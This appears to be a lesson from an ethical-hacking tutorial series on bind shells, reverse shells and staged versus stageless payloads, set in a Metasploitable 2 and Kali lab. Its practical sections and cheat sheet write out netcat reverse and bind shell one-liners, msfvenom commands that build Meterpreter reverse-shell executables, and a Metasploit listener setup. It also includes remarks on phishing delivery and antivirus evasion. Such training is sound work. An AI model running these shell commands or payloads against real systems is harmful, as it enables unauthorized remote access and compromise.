# Day 15 — Exploitation: Reverse Shell, Bind Shell & Payloads

> 📚 Part of the **"Learn Ethical Hacking in 30 Days"** series.  
> Previous: [Day 14 — Finding Exploits](#) | Next: [Day 16](#)

---

## 📋 Table of Contents

1. [What is a Shell?](#1-what-is-a-shell)
2. [Bind Shell](#2-bind-shell)
3. [Reverse Shell](#3-reverse-shell)
4. [Bind Shell vs Reverse Shell — Full Comparison](#4-bind-shell-vs-reverse-shell--full-comparison)
5. [What is a Payload?](#5-what-is-a-payload)
6. [Staged vs Stageless Payloads](#6-staged-vs-stageless-payloads)
7. [Practical: Bind Shell with Netcat](#7-practical-bind-shell-with-netcat)
8. [Practical: Reverse Shell with Netcat](#8-practical-reverse-shell-with-netcat)
9. [Practical: Staged vs Stageless with msfvenom](#9-practical-staged-vs-stageless-with-msfvenom)
10. [Quick Reference Cheat Sheet](#10-quick-reference-cheat-sheet)

---

## 1. What is a Shell?

When a hacker compromises a system, they want **shell access** — the ability to run commands on the target machine remotely.

**Two types of interfaces:**

| Interface | Description | Example |
|-----------|-------------|---------|
| **GUI** (Graphical User Interface) | Click-based interface | Windows Desktop |
| **CLI** (Command Line Interface) | Text/command based | Terminal, Bash |

> 💡 Most servers only have CLI. When a hacker "gets a shell", they mean they can run commands on the target via a terminal-like interface.

**Two types of shells a hacker can get:**
```
Shell Access
├── Bind Shell   (attacker connects TO target)
└── Reverse Shell (target connects TO attacker)  ← most common
```

---

## 2. Bind Shell

In a **Bind Shell**, the target machine opens a port and **listens** for incoming connections. The attacker then **connects to that open port**.

```
[Attacker Machine] ──────────── connects to ──────────▶ [Target Server]
                                                         (listening on port 4444)
```

**How it works:**
1. Attacker exploits a vulnerability on the target
2. Target opens a port (e.g., 4444) and starts listening
3. Attacker connects to that port from their machine
4. Shell access established — attacker can run commands

> 🏠 **Analogy:** The thief unlocks a specific door in the building and leaves it open. They can return and walk through that door any time.

---

## 3. Reverse Shell

In a **Reverse Shell**, the attacker's machine listens, and the **target connects back** to the attacker.

```
[Attacker Machine] ◀──────── connects back ──────────── [Target Server]
(listening on port 4444)
```

**How it works:**
1. Attacker sets up a listener on their machine (e.g., port 4444)
2. Attacker sends a payload to the target (via phishing email, exploit, etc.)
3. Target executes the payload → target's machine connects back to the attacker
4. Shell access established

> 🏠 **Analogy:** The thief sends a message to someone inside the building telling them to open the door from the inside and call out. The inside person does it without realizing they're helping the thief.

**Why reverse shells are preferred:**
- Bypasses most **firewalls** — outbound traffic from target looks legitimate
- No need for attacker to know the target's IP in advance
- Most phishing payloads use reverse shells

---

## 4. Bind Shell vs Reverse Shell — Full Comparison

| Parameter | Bind Shell | Reverse Shell |
|-----------|-----------|---------------|
| **Connection direction** | Attacker → Target | Target → Attacker |
| **Who listens** | Target machine (open port) | Attacker machine |
| **Common use** | Persistence / backdoors | Initial access, phishing payloads |
| **Firewall bypass** | ❌ Often blocked (inbound blocked) | ✅ More likely to bypass (outbound allowed) |
| **Attacker needs target IP?** | ✅ Yes | ❌ No (target connects to attacker) |
| **Target needs attacker IP?** | ❌ No | ✅ Yes (hardcoded in payload) |
| **Security risk** | Exposes open port — any hacker can find it via nmap | Less exposure — no persistent open port |
| **Detection risk** | Higher — open port is visible | Lower — looks like outbound web traffic |
| **Protocol used** | TCP / UDP directly on a port | HTTPS, DNS (to look like legit traffic) |

---

## 5. What is a Payload?

**Key definitions:**

| Term | Definition |
|------|-----------|
| **Vulnerability** | A weakness/flaw in software or a system that can be abused |
| **Exploit** | Code that takes advantage of a vulnerability |
| **Payload** | The malicious code delivered via the exploit that performs the attacker's desired action |

> 🍳 **Analogy:** Cooking is the overall process (exploit). The ingredients (payload) are what actually make the dish. The payload is what actually *does the work* on the target system.

**What a payload can do:**
- Give a reverse shell
- Give a bind shell
- Encrypt files (ransomware)
- Install a backdoor
- Steal credentials
- Open a VNC/RDP session

---

## 6. Staged vs Stageless Payloads

### Stageless Payload

A **single self-contained executable** that includes everything needed to execute — no additional downloads required.

```
[Attacker] ──sends──▶ [malicious.exe] ──▶ [Victim runs it] ──▶ [Reverse shell to attacker]
                        (everything inside)
```

**Flow:** One file → victim executes → shell received. Done.

---

### Staged Payload

A **two-part delivery** — a small dropper (Stage 1) runs first, then downloads and executes the main payload (Stage 2) from the attacker's C2 server.

```
[Attacker C2 Server]
        ▲
        │ (2) Dropper connects and downloads main payload
        │
[Victim] ──runs──▶ [dropper.exe] ──▶ connects to C2 ──▶ [main payload executes] ──▶ [Shell]
                    (small, stealthy)
```

**Flow:** Small dropper → executes → calls home → downloads real payload → shell received.

---

### Staged vs Stageless — Full Comparison

| Parameter | Staged Payload | Stageless Payload |
|-----------|---------------|-------------------|
| **Definition** | Multi-part: dropper + main payload | Single self-contained executable |
| **Execution** | Two steps: dropper runs → downloads + runs main payload | One step: execute → done |
| **File size** | Smaller (dropper only) | Larger (everything packed in) |
| **AV detection** | Lower — small dropper is harder to detect | Higher — full payload is easier to signature-match |
| **Network needed?** | ✅ Yes — needs internet to download payload from C2 | ❌ No — works standalone once executed |
| **Complexity** | Higher — needs C2 server infrastructure | Lower — just one file |
| **Best for** | Tight memory constraints, AV evasion | Simple, offline, or CTF scenarios |
| **Stealth** | More stealthy | Less stealthy |

### When to Use Which

```
Use STAGELESS when:
  → Simple CTF / lab environments
  → No AV present
  → Quick testing
  → Offline targets (no internet on victim)

Use STAGED when:
  → Real-world engagements
  → AV/EDR is present on target
  → Need AV evasion
  → Memory constraints in the exploit buffer
  → Need dropper to fingerprint environment first
```

---

## 7. Practical: Bind Shell with Netcat

**Scenario:** Target = Metasploitable 2 (`192.168.29.150`), Attacker = Kali (`192.168.29.10`)

### Step 1: Open a listening port on the TARGET machine

Run this on the **target** (Metasploitable 2):
```bash
nc -lvp 4444 -e /bin/bash
```

| Part | Meaning |
|------|---------|
| `nc` | Netcat |
| `-l` | Listen mode |
| `-v` | Verbose output |
| `-p 4444` | Listen on port 4444 |
| `-e /bin/bash` | Execute bash when someone connects |

### Step 2: Connect from the ATTACKER machine

Run this on the **attacker** (Kali):
```bash
nc -v 192.168.29.150 4444
```

**Result:** You're now inside the target machine — run any command:
```bash
whoami       # Shows current user (e.g., msfadmin)
ls           # List files on target
id           # Show user ID and groups
uname -a     # Show target OS info
```

---

## 8. Practical: Reverse Shell with Netcat

**Scenario:** Same machines as above.

### Step 1: Start listener on the ATTACKER machine

Run this on **Kali** (attacker):
```bash
nc -lvp 4444
```

### Step 2: Trigger connection FROM the TARGET machine

Run this on the **target** (Metasploitable 2):
```bash
nc 192.168.29.10 4444 -e /bin/bash
```

| Part | Meaning |
|------|---------|
| `192.168.29.10` | Attacker's IP |
| `4444` | Attacker's listening port |
| `-e /bin/bash` | Send a bash shell to the attacker |

**Result:** On the attacker's terminal, a shell connection appears:
```bash
whoami       # msfadmin
ls           # files on target
```

> 💡 In real attacks, the `nc 192.168.29.10 4444 -e /bin/bash` part is embedded inside a phishing payload or exploit. When the victim triggers it, the reverse shell connects back automatically.

---

## 9. Practical: Staged vs Stageless with msfvenom

**msfvenom** is Metasploit's payload generator. You can identify payload type from its naming convention.

### List available payloads

```bash
msfvenom -l payloads | grep "windows/meterpreter/reverse_tcp"
```

### Identifying Staged vs Stageless by Name

```
Staged payload (uses / slash):
  windows/x64/meterpreter/reverse_tcp
                          ^
                    slash = staged

Stageless payload (uses _ underscore):
  windows/x64/meterpreter_reverse_tcp
                          ^
                    underscore = stageless
```

> 🔑 **Key Rule:**
> - `/` (forward slash) between components = **Staged**
> - `_` (underscore) between components = **Stageless**

### Generating a Stageless Payload (Windows Reverse Shell)

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<your-ip> LPORT=4444 -f exe -o payload.exe
```

### Generating a Staged Payload (Windows Reverse Shell)

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<your-ip> LPORT=4444 -f exe -o staged_payload.exe
```

### Common msfvenom Payload Examples

```bash
# Windows stageless reverse shell (exe)
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o shell.exe

# Windows staged reverse shell (exe)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o staged.exe

# Linux stageless reverse shell (elf)
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o shell.elf

# Linux staged reverse shell (elf)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o staged.elf

# PHP reverse shell (web)
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o shell.php

# Python reverse shell
msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=4444 -f raw -o shell.py

# List all payloads
msfvenom -l payloads

# List payloads filtered by platform
msfvenom -l payloads | grep windows
msfvenom -l payloads | grep linux
msfvenom -l payloads | grep python
```

### Setting Up Listener for msfvenom Payload (in Metasploit)

```bash
msfconsole

use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp   # match your payload
set LHOST <your-kali-ip>
set LPORT 4444
run
```

---

## 10. Quick Reference Cheat Sheet

### Shell Types

```
Bind Shell:    Target listens → Attacker connects TO target
Reverse Shell: Attacker listens → Target connects BACK to attacker
```

### Netcat — Bind Shell
```bash
# On TARGET — open backdoor
nc -lvp 4444 -e /bin/bash

# On ATTACKER — connect to backdoor
nc -v <target-ip> 4444
```

### Netcat — Reverse Shell
```bash
# On ATTACKER — listen
nc -lvp 4444

# On TARGET — connect back
nc <attacker-ip> 4444 -e /bin/bash
```

### Payload Type Identification (msfvenom)
```
/ slash     = STAGED    (windows/x64/meterpreter/reverse_tcp)
_ underscore = STAGELESS (windows/x64/meterpreter_reverse_tcp)
```

### msfvenom Quick Reference
```bash
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <output>

# Common formats:
-f exe      → Windows executable
-f elf      → Linux executable
-f raw      → Raw shellcode / script
-f war      → Java WAR file (Tomcat)
-f jar      → Java JAR file

# List payloads
msfvenom -l payloads | grep <filter>
```

### Metasploit Handler
```bash
msfconsole
use exploit/multi/handler
set payload <same-payload-as-msfvenom>
set LHOST <your-ip>
set LPORT 4444
run
```

---

> ✅ **End of Day 15 Notes**  
> 📌 Next up: Using **Metasploit** to exploit vulnerabilities and get shells  
> 💡 Practice: On a Metasploitable 2 lab — try both bind and reverse shell with netcat  
> ⚠️ Only practice on machines you own or have explicit permission to test  
> 💬 Questions? Drop them in the comments!